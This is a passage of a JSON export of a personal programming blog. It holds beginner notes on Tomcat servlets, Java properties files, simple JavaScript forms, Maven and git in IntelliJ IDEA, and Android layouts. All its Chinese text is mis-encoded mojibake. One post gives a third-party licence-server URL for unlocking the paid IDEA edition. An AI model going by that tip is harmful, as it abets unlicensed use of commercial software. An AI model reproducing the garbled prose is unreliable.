//åœ¨tomcaté‡Œé¢çš„webappsé‡Œé¢ /** ---------webapps -----------|myweb ---------------|WEB-INF ------------------|classeså°†åˆšåˆšç¼–è¯‘è¿‡çš„helloservletçš„classæ–‡ä»¶æ”¾è¿›classï¼Œè®°å¾—å°†åŒ…ä¹Ÿå¸¦ä¸Š ------------------|lib ------------------|src ------------------|web.xml */ //ä¸‹é¢æ˜¯web.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; version=&quot;3.1&quot;&gt; &lt;!--é…ç½®ä¸€ä¸ªservletç¨‹åº--&gt; &lt;servlet&gt; &lt;!--servletçš„å†…éƒ¨åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰--&gt; &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt; &lt;!--servletç±»åï¼šåŒ…å+ç®€å•ç±»å--&gt; &lt;servlet-class&gt;com.husky.sever.HelloServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;!--servletçš„å†…éƒ¨åç§°ï¼Œå’Œä¸Šé¢çš„åç§°ä¿æŒä¸€è‡´--&gt; &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt; &lt;!--servletçš„è®¿é—®åç§°ï¼š /åç§°--&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;/web-app&gt; //å°†tomcatçš„startup.batç‚¹å‡»åï¼Œæµè§ˆå™¨è¾“å…¥http://localhost:ç«¯å£å·/myweb/hello","categories":[],"tags":[]},{"title":"é…ç½®æ–‡ä»¶è·¯å¾„å¦‚ä½•å†™","slug":"é…ç½®æ–‡ä»¶è·¯å¾„å¦‚ä½•å†™","date":"2017-11-14T12:30:37.000Z","updated":"2020-11-14T17:11:37.264Z","comments":true,"path":"2017/11/14/é…ç½®æ–‡ä»¶è·¯å¾„å¦‚ä½•å†™/","link":"","permalink":"http://yoursite.com/2017/11/14/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E5%A6%82%E4%BD%95%E5%86%99/","excerpt":"","text":"Demo1.java package com.husky.path; import java.io.FileReader; import java.io.InputStream; import java.util.Properties; /** * é…ç½®æ–‡ä»¶çš„è·¯å¾„åº”è¯¥å¦‚ä½•å»å†™ï¼Ÿ * ç»å¯¹è·¯å¾„ï¼šä¸€ä¸ªæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ä¿¡æ¯ã€‚ä¸€èˆ¬ç»å¯¹è·¯å¾„å¸¦ç›˜ç¬¦ï¼Œæ— æ³•ä½¿ç”¨ * ç›¸å¯¹è·¯å¾„ï¼šç›¸å¯¹äºå½“å‰ç¨‹åºçš„è·¯å¾„ã€‚å½“å‰è·¯å¾„å°±æ˜¯æ‰§è¡Œjavaå‘½ä»¤çš„æ—¶å€™ï¼Œæ§åˆ¶å°çš„ä½ç½® * ç±»æ–‡ä»¶è·¯å¾„ï¼šç±»æ–‡ä»¶è·¯å¾„å°±æ˜¯ä½¿ç”¨äº†classpathçš„è·¯å¾„æ‰¾åˆ°ç›¸åº”çš„èµ„æº * å¦‚æœéœ€è¦ä½¿ç”¨ç±»æ–‡ä»¶è·¯å¾„é¦–å…ˆè¦è·å–ä¸€ä¸ªClasså¯¹è±¡ * * * */ public class Demo1 { static Properties properties; static{ try{ properties = new Properties(); Class clazz = Demo1.class; InputStream inputStream = clazz.getResourceAsStream(&quot;/db.properties&quot;); properties.load(inputStream); }catch (Exception e){ e.printStackTrace(); } } public static void main(String[] args){ System.out.println(&quot;username:&quot;+properties.getProperty(&quot;user&quot;)+&quot;å¯†ç :&quot;+properties.getProperty(&quot;password&quot;)); } }db.properties user=husky password=dabendan","categories":[],"tags":[]},{"title":"jsç®€å•å­—æ¯éªŒè¯ç ","slug":"jsç®€å•å­—æ¯éªŒè¯ç ","date":"2017-11-14T12:17:50.000Z","updated":"2020-11-14T17:11:37.968Z","comments":true,"path":"2017/11/14/jsç®€å•å­—æ¯éªŒè¯ç /","link":"","permalink":"http://yoursite.com/2017/11/14/js%E7%AE%80%E5%8D%95%E5%AD%97%E6%AF%8D%E9%AA%8C%E8%AF%81%E7%A0%81/","excerpt":"","text":"&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot;&gt; function createCode() { var datas = [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;,&apos;E&apos;,&apos;F&apos;]; var code = &quot;&quot;; for(var i = 0;i &lt; 4;i++){ var index = Math.floor(Math.random()*datas.length); code += datas[index]; } var spanNode = document.getElementById(&quot;code&quot;); spanNode.innerHTML = code; } function ready() { createCode(); } &lt;/script&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;äº§ç”ŸéªŒè¯ç &lt;/title&gt; &lt;/head&gt; &lt;body onload=&quot;ready()&quot;&gt; &lt;span id=&quot;code&quot;&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; onclick=&quot;createCode()&quot;&gt;çœ‹ä¸æ¸…ï¼Œæ¢ä¸€ä¸ª&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;é‡ç‚¹ï¼š1.onloadï¼Œåœ¨jsé‡Œé¢å†™ä¸€ä¸ªfunction readyï¼ˆï¼‰ï¼Œç„¶åè°ƒç”¨é˜²æ­¢æ‰¾ä¸åˆ°ï¼Œå› ä¸ºåˆšå¼€å§‹è¿è¡Œæ—¶ï¼Œæ— æ³•æ‰¾åˆ°id code2 .&lt;span id=&quot;code&quot;&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; onclick=&quot;createCode()&quot;&gt;çœ‹ä¸æ¸…ï¼Œæ¢ä¸€ä¸ª&lt;/a&gt;è¿™å¥å°±æ˜¯spané‡Œé¢ä¸æ”¾ä¸œè¥¿ï¼Œå¯ä»¥åæ¥å†æ”¾è¿›å»","categories":[],"tags":[]},{"title":"åŸå¸‚çš„è”åŠ¨æ¡†","slug":"åŸå¸‚çš„è”åŠ¨æ¡†","date":"2017-11-14T12:12:58.000Z","updated":"2020-11-14T17:11:38.516Z","comments":true,"path":"2017/11/14/åŸå¸‚çš„è”åŠ¨æ¡†/","link":"","permalink":"http://yoursite.com/2017/11/14/%E5%9F%8E%E5%B8%82%E7%9A%84%E8%81%94%E5%8A%A8%E6%A1%86/","excerpt":"","text":"&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot;&gt; function showCity() { var citys = [[],[&quot;guangzhou&quot;,&quot;fousan&quot;,&quot;zhongsan&quot;],[&quot;changsha&quot;,&quot;hengyang&quot;,&quot;yueyang&quot;]]; var provinceNode = document.getElementById(&quot;province&quot;); var selectIndex = provinceNode.selectedIndex; var cityDatas = citys[selectIndex]; var cityNode = document.getElementById(&quot;city&quot;); // //å…ˆæ¸…ç©ºcityæ¡†æ‰€æœ‰option // var children = cityNode.childNodes; // for(var i = 0; i&lt;children.length ; ){ // cityNode.removeChild(children[i]); // } cityNode.options.length = 1; for(var index = 0;index&lt;cityDatas.length;index++){ var option = document.createElement(&quot;option&quot;); option.innerHTML = cityDatas[index]; cityNode.appendChild(option); } } &lt;/script&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; çœä»½&lt;select id=&quot;province&quot; onchange=&quot;showCity()&quot;&gt; &lt;option&gt;çœä»½&lt;/option&gt; &lt;option&gt;å¹¿ä¸œ&lt;/option&gt; &lt;option&gt;æ¹–å—&lt;/option&gt; &lt;/select&gt; åŸå¸‚&lt;select id=&quot;city&quot;&gt;&lt;option&gt;åŸå¸‚&lt;/option&gt;&lt;/select&gt; &lt;/body&gt; &lt;/html&gt;å®ç°çš„è”åŠ¨æ¡†ï¼Œä¸»è¦å°±æ˜¯å½“ç¬¬ä¸€ä¸ªä¸‹æ‹‰æ¡†onchangeæ—¶ï¼Œè·å–å…¶ä¸­çš„selectIndexï¼Œå†é€šè¿‡è¿™ä¸ªç´¢å¼•å€¼è·å–é€‰ä¸­çš„å…ƒç´ ï¼Œæ ¹æ®å…ƒç´ æ¥å®ç°ä¸‹ä¸€ä¸ªä¸‹æ‹‰æ¡†çš„option","categories":[],"tags":[]},{"title":"ç”¨ideaåˆ›å»ºmavenç®€å•çš„javaé¡¹ç›®","slug":"ç”¨ideaåˆ›å»ºmavenç®€å•çš„javaé¡¹ç›®","date":"2017-11-03T02:39:54.000Z","updated":"2020-11-14T17:11:40.689Z","comments":true,"path":"2017/11/03/ç”¨ideaåˆ›å»ºmavenç®€å•çš„javaé¡¹ç›®/","link":"","permalink":"http://yoursite.com/2017/11/03/%E7%94%A8idea%E5%88%9B%E5%BB%BAmaven%E7%AE%80%E5%8D%95%E7%9A%84java%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"é¦–å…ˆï¼Œmavenç‰¹åˆ«åƒandroidé‡Œé¢build.gradleé‡Œé¢dependenciesï¼Œä¸ªäººæ„Ÿè§‰å¾ˆæ£’ã€‚å¾ˆæ–¹ä¾¿é¦–å…ˆï¼Œeclipseåˆ›å»ºmavenå¾ˆç®€å•ï¼Œä½ åœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œä¸‹é¢ä¼šæœ‰maven project. è¿›å…¥ä¸»é¢˜ï¼Œåœ¨ideaé‡Œé¢åˆ›å»ºmaven project1.ä¸é€‰ä»»ä½•ä¸œè¥¿2. éšæ„å¡«ï¼Œæˆ‘ä¹Ÿä¸æ˜¯å¤ªæ‡‚è¿™ä¸ªæ ¼å¼ï¼Œä½†æ˜¯å¹¶ä¸å½±å“3. ç„¶åfinish4. ç›®å½•åƒä¸Šå›¾è¿™æ ·5. ä¿®æ”¹pom.xml,å¹¶åœ¨ä½ ä»¬ä¿®æ”¹ï¼Œå¯¼å…¥org.jsonä¿®æ”¹çš„æ—¶å€™ï¼Œä¼šæç¤ºauto-importï¼Œä½ é€‰æ‹©ä¸€ä¸‹è¿™ä¸ª6. åˆ›å»ºä¸€ä¸ªjavaç¨‹åºï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œé€šè¿‡import org.json.JSONObjectï¼Œçœ‹æ˜¯å¦å¯¼å…¥æˆåŠŸ","categories":[],"tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"},{"name":"idea","slug":"idea","permalink":"http://yoursite.com/tags/idea/"}]},{"title":"idea é…ç½® tomcat","slug":"idea é…ç½® tomcat","date":"2017-10-31T08:58:19.000Z","updated":"2020-11-14T17:11:41.393Z","comments":true,"path":"2017/10/31/idea é…ç½® tomcat/","link":"","permalink":"http://yoursite.com/2017/10/31/idea%20%E9%85%8D%E7%BD%AE%20tomcat/","excerpt":"","text":"å‡ºç°unable to open the service tomcatæ€ä¹ˆåŠ å…·ä½“é…ç½® IntelliJ IDEA 2016.2 é…ç½®Tomcat è¿è¡ŒWebé¡¹ç›® ä¸Šé¢è¿™ä¸ªé…ç½®å¿…é¡»æ˜¯æ”¶è´¹ç‰ˆçš„ï¼Œå› ä¸ºç¤¾åŒºç‰ˆä¸æ”¯æŒtomcatè¿™äº›ï¼Œå…·ä½“ä½ å¯ä»¥åœ¨ideaå®˜ç½‘ä¸Šé¢çœ‹åˆ°ã€‚æ”¶è´¹ç‰ˆçš„æ³¨å†Œç ï¼Œlicense serverï¼Œï¼Œ http://idea.iteblog.com/key.php é…ç½®å½“ä¸­å”¯ä¸€æœ‰ä¸ªå°ç¼ºç‚¹å°±æ˜¯åœ¨ ![è¿™é‡Œå†™å›¾ç‰‡æè¿°](http://qjrzrivoh.hd-bkt.clouddn.com/1605373901.17446359955.png)application serveré€‰æ‹©configureï¼Œtomcatçš„å®‰è£…è·¯å¾„ï¼Œç„¶åok Intellij IDEA 2017åˆ›å»ºç¬¬ä¸€ä¸ªStruts2ç¨‹åº","categories":[],"tags":[]},{"title":"gitä¸Šä¼ é¡¹ç›®","slug":"gitä¸Šä¼ é¡¹ç›®","date":"2017-10-11T08:41:08.000Z","updated":"2020-11-14T17:11:41.997Z","comments":true,"path":"2017/10/11/gitä¸Šä¼ é¡¹ç›®/","link":"","permalink":"http://yoursite.com/2017/10/11/git%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"æ‰“å¼€github create a new Repositryï¼Œå¡«å†™Repository nameï¼Œç„¶åcreate repository æ‰“å¼€ä½ è¦æäº¤çš„é¡¹ç›®çš„ç›®å½•ï¼Œæ‰“å¼€ç»ˆç«¯ git initåˆå§‹åŒ–ç©ºçš„gitä»“åº“ git add . git commit -mâ€RecyclerViewâ€åœ¨å¼•å·é‡Œé¢æ˜¯æ³¨é‡Šéƒ¨åˆ† git remote add origin git@github.com:pompeii666/UIPractice.gitï¼ˆä»‹ç»ä¸€ä¸‹ï¼Œgit remote add + origin+ä»“åº“åœ°å€ï¼‰ä»“åº“åœ°å€æ˜¯ä½ åœ¨åˆ›å»ºåä¼šæœ‰çš„ï¼Œoriginæ˜¯æ ‡è¯†ç¬¦ git push -u origin masterå½“å‰åˆ†æ”¯çš„å†…å®¹å°±ä¼šè¢«æ¨é€åˆ°è¿œç¨‹ä»“åº“originçš„masteråˆ†æ”¯ å…·ä½“è¿˜å¯ä»¥çœ‹ http://www.ruanyifeng.com/blog/2014/06/git_remote.html http://www.cnblogs.com/specter45/p/github.html æ›´æ–°é¡¹ç›® æ‰“å¼€ä¹‹å‰çš„å·¥ç¨‹çš„é¡¹ç›®çš„ç›®å½•git status git add .(æ›´æ–°å„ä¸ªä¿®æ”¹è¿‡çš„æ–‡ä»¶) git statusï¼ˆä¼šå‘ç°å·²ç»æˆåŠŸäº†ï¼‰ git commit -a git push å…·ä½“çš„è¿˜å¯ä»¥çœ‹ æ›´æ–°é¡¹ç›® Everything up-to-date","categories":[],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]},{"title":"ubuntuåˆ›å»ºçƒ­ç‚¹","slug":"ubuntuåˆ›å»ºçƒ­ç‚¹","date":"2017-09-15T01:25:53.000Z","updated":"2020-11-14T17:11:42.476Z","comments":true,"path":"2017/09/15/ubuntuåˆ›å»ºçƒ­ç‚¹/","link":"","permalink":"http://yoursite.com/2017/09/15/ubuntu%E5%88%9B%E5%BB%BA%E7%83%AD%E7%82%B9/","excerpt":"","text":"http://www.cnblogs.com/king-ding/archive/2016/10/09/ubuntuWIFI.html","categories":[],"tags":[]},{"title":"Toastå¼¹å‡ºä¿¡æ¯","slug":"Toastå¼¹å‡ºä¿¡æ¯","date":"2017-09-12T13:01:26.000Z","updated":"2020-11-14T17:11:42.951Z","comments":true,"path":"2017/09/12/Toastå¼¹å‡ºä¿¡æ¯/","link":"","permalink":"http://yoursite.com/2017/09/12/Toast%E5%BC%B9%E5%87%BA%E4%BF%A1%E6%81%AF/","excerpt":"","text":"åšäº†ä¸€ä¸ªåˆ¤æ–­æ•°é‡çš„æ¡†ï¼ŒèŒƒå›´æ˜¯0-100ï¼Œä½†æ˜¯ä¸€æ—¦å°äº0ï¼Œæˆ–è€…å¤§äº100ï¼Œå°±è¦æç¤ºç”¨æˆ·ï¼Œä¸èƒ½è¶Šç•Œã€‚è¿™ä¸ªæ—¶å€™ï¼Œæ ¹æ®è§†é¢‘ä¸­æç¤ºï¼ŒçŸ¥é“äº†Toastï¼Œgoogleäº†ä¸€ä¼šï¼Œçœ‹ä¸æ‡‚ï¼Œç„¶åçœ‹äº†ä¸­æ–‡çš„ä¸€èˆ¬æœ‰5ç§ï¼ˆåˆ«çš„äººåšå®¢ä»‹ç»çš„ï¼‰å°±è®²ç¬¬ä¸€ç§å§ï¼Œ Toast.makeText(MainActivity.this, &quot;Hello&quot;, Toast.LENGTH_SHORT).show();ä¼šåœ¨åº•éƒ¨å¼¹å‡ºï¼Œhelloï¼Œä½†æ˜¯å¦‚æœæ˜¯é€šè¿‡æŒ‰é’®æ¥è§¦å‘è¿™ä¸ªï¼Œè€Œä¸”æŒ‰é’®æŒ‰äº†å¾ˆå¤šæ¬¡ï¼Œä¼šå¯¼è‡´ï¼ŒToastä¸€ç›´å­˜åœ¨åœ¨è¿™å„¿ï¼Œå¾ˆå½±å“ç”¨æˆ·ä½“éªŒã€‚æ‰€ä»¥ï¼Œåˆçœ‹åˆ°ä¸€ç¯‡ private static Toast myToast; public static void showToast(Context context, String str) { if(myToast == null) { myToast = Toast.makeText(context, str, Toast.LENGTH_SHORT); } else { myToast.setText(str); } myToast.show(); }åœ¨newä¸€ä¸ªToastä¹‹å‰å…ˆåˆ¤æ–­è¿™ä¸ªmyToastæ˜¯ä¸æ˜¯ä¸ºNULL,å¦‚æœä¸æ˜¯NULLï¼Œå°±ä¸è¦å†å»newäº†ï¼Œä»¥å…é˜Ÿåˆ—ä¸­å­˜æ”¾è¿‡å¤šçš„Toastã€‚å¦‚æœä¸ä¸ºNULLï¼Œåªæ˜¯æ”¹å˜äº†myToastçš„æ˜¾ç¤ºæ–‡å­—ï¼Œå¹¶è°ƒç”¨show()æ–¹æ³•ã€‚è¿™æ ·å°±é¿å…é˜Ÿåˆ—ä¸­äº§ç”Ÿå¤§é‡Toastäº†ã€‚å…·ä½“ä¿¡æ¯ï¼Œæ¥è‡ª http://blog.csdn.net/u012575819/article/details/51194160","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"ScrollView","slug":"ScrollView","date":"2017-09-11T12:40:54.000Z","updated":"2020-11-14T17:11:43.677Z","comments":true,"path":"2017/09/11/ScrollView/","link":"","permalink":"http://yoursite.com/2017/09/11/ScrollView/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;ScrollView xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:padding=&quot;10dp&quot; tools:context=&quot;com.example.android.scrollviewdemo.MainActivity&quot;&gt; &lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot;&gt; &lt;ImageView android:id=&quot;@+id/imageView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;200dp&quot; android:scaleType=&quot;centerCrop&quot; android:src=&quot;@drawable/kebe&quot;/&gt; &lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Know more&quot;/&gt; &lt;TextView android:id=&quot;@+id/titleTextView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;@string/title&quot; android:textAppearance=&quot;?android:attr/textAppearanceLarge&quot;/&gt; &lt;TextView android:id=&quot;@+id/contentTextView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;@string/content&quot; android:textAppearance=&quot;?android:attr/textAppearanceSmall&quot;/&gt; &lt;/LinearLayout&gt; &lt;/ScrollView&gt;![ScrollViewExampleImage](http://qjrzrivoh.hd-bkt.clouddn.com/1605373903.40850882446.png) http://stacktips.com/tutorials/android/android-scrollview-example å…·ä½“çœ‹è¿™å„¿","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"Log_å‘ Android æ—¥å¿—ä¸­å†™æ¶ˆæ¯","slug":"Log_å‘ Android æ—¥å¿—ä¸­å†™æ¶ˆæ¯","date":"2017-09-11T09:39:02.000Z","updated":"2020-11-14T17:11:44.188Z","comments":true,"path":"2017/09/11/Log_å‘ Android æ—¥å¿—ä¸­å†™æ¶ˆæ¯/","link":"","permalink":"http://yoursite.com/2017/09/11/Log_%E5%90%91%20Android%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%86%99%E6%B6%88%E6%81%AF/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot; android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot; android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot; android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot; android:paddingTop=&quot;@dimen/activity_vertical_margin&quot; tools:context=&quot;.MainActivity&quot;&gt; &lt;TextView android:id=&quot;@+id/menu_item_1&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Mango sorbet&quot; android:textAppearance=&quot;?android:textAppearanceMedium&quot; /&gt; &lt;TextView android:id=&quot;@+id/menu_item_2&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;8dp&quot; android:text=&quot;Blueberry pie&quot; android:textAppearance=&quot;?android:textAppearanceMedium&quot; android:textSize=&quot;18sp&quot; /&gt; &lt;TextView android:id=&quot;@+id/menu_item_3&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;8dp&quot; android:text=&quot;Chocolate lava cake&quot; android:textAppearance=&quot;?android:textAppearanceMedium&quot; android:textSize=&quot;18sp&quot; /&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;8dp&quot; android:onClick=&quot;printToLogs&quot; android:text=&quot;Print menu to logs&quot; /&gt; &lt;/LinearLayout&gt;MainActivity.java package com.example.android.menu; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.util.Log; import android.view.View; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } public void printToLogs(View view){ // Find first menu item TextView and print the text to the logs TextView temp = (TextView) findViewById(R.id.menu_item_1); String tempString = temp.getText().toString(); Log.i(&quot;MainActivity&quot;,tempString); // Find second menu item TextView and print the text to the logs temp = (TextView) findViewById(R.id.menu_item_2); tempString = temp.getText().toString(); Log.i(&quot;MainActivity&quot;,tempString); // Find third menu item TextView and print the text to the logs temp = (TextView) findViewById(R.id.menu_item_3); tempString = temp.getText().toString(); Log.i(&quot;MainActivity&quot;,tempString); } }é‡ç‚¹å†…å®¹ è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨äº† Log.i()ï¼Œè¡¨ç¤ºâ€œä¿¡æ¯â€çº§åˆ«çš„æ—¥å¿—ã€‚å…¶ä»–çº§åˆ«çš„é€‰é¡¹å¦‚ä¸‹æ‰€ç¤ºï¼š e(String, String)ï¼ˆé”™è¯¯ï¼‰w(String, String)ï¼ˆè­¦å‘Šï¼‰i(String, String)ï¼ˆä¿¡æ¯ï¼‰d(String, String)ï¼ˆè°ƒè¯•ï¼‰v(String, String) (è¯¦æƒ…)2.å…·ä½“åº”è¯¥æ˜¯åœ¨æŒ‰æŒ‰é’®æ—¶ä½¿ç”¨çš„ï¼Œæ­£å¥½è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚3.æŸ¥çœ‹æ–¹å¼ï¼šandroid studioé‡Œé¢ï¼Œæœ€ä¸‹é¢æœ‰ä¸€ä¸ªandroidmonitorï¼Œé‡Œé¢çš„logcatï¼Œå¦‚æœæ˜¯Log.iåˆ™é€‰æ‹©infoï¼Œç„¶åå¯ä»¥è¾“å…¥tagè¿˜æ˜¯ä¸‹æ‹‰tagï¼Œå¯ä»¥æ‰¾åˆ°å…·ä½“ä¿¡æ¯","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"è®¡åˆ†å™¨","slug":"è®¡åˆ†å™¨","date":"2017-09-10T03:20:59.000Z","updated":"2020-11-14T17:11:44.990Z","comments":true,"path":"2017/09/10/è®¡åˆ†å™¨/","link":"","permalink":"http://yoursite.com/2017/09/10/%E8%AE%A1%E5%88%86%E5%99%A8/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot; android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot; android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot; android:paddingTop=&quot;@dimen/activity_vertical_margin&quot; tools:context=&quot;com.example.android.courtcounter.MainActivity&quot;&gt; &lt;RelativeLayout android:id=&quot;@+id/team_a_view&quot; android:layout_width=&quot;170dp&quot; android:layout_height=&quot;300dp&quot; &gt; &lt;TextView android:id=&quot;@+id/team_a&quot; android:text=&quot;Team A&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;14sp&quot; android:textColor=&quot;#616161&quot; android:fontFamily=&quot;sans-serif-medium&quot;/&gt; &lt;TextView android:id=&quot;@+id/scoreA_text_view&quot; android:text=&quot;0&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_below=&quot;@+id/team_a&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;56sp&quot; android:textColor=&quot;#000000&quot; android:fontFamily=&quot;sans-serif-light&quot;/&gt; &lt;Button android:id=&quot;@+id/point_3&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;+3 point&quot; android:layout_below=&quot;@+id/scoreA_text_view&quot; android:onClick=&quot;addThreeTeamA&quot;/&gt; &lt;Button android:id=&quot;@+id/point_2&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; android:text=&quot;+2 point&quot; android:layout_below=&quot;@+id/point_3&quot; android:onClick=&quot;addTwoTeamA&quot;/&gt; &lt;Button android:id=&quot;@+id/free_point&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;free point&quot; android:layout_below=&quot;@+id/point_2&quot; android:onClick=&quot;addOneTeamA&quot;/&gt; &lt;/RelativeLayout&gt; &lt;RelativeLayout android:id=&quot;@+id/line&quot; android:layout_width=&quot;1dp&quot; android:layout_height=&quot;300dp&quot; android:layout_toRightOf=&quot;@+id/team_a_view&quot; android:background=&quot;@android:color/darker_gray&quot;&gt; &lt;/RelativeLayout&gt; &lt;RelativeLayout android:id=&quot;@+id/team_b_view&quot; android:layout_width=&quot;170dp&quot; android:layout_height=&quot;300dp&quot; android:layout_toRightOf=&quot;@+id/line&quot;&gt; &lt;TextView android:id=&quot;@+id/team_b&quot; android:text=&quot;Team B&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;14sp&quot; android:textColor=&quot;#616161&quot; android:fontFamily=&quot;sans-serif-medium&quot;/&gt; &lt;TextView android:id=&quot;@+id/scoreB_text_view&quot; android:text=&quot;0&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; android:layout_below=&quot;@+id/team_b&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;56sp&quot; android:textColor=&quot;#000000&quot; android:fontFamily=&quot;sans-serif-light&quot;/&gt; &lt;Button android:id=&quot;@+id/pointB_3&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;+3 point&quot; android:layout_below=&quot;@+id/scoreB_text_view&quot; android:onClick=&quot;addThreeTeamB&quot;/&gt; &lt;Button android:id=&quot;@+id/pointB_2&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; 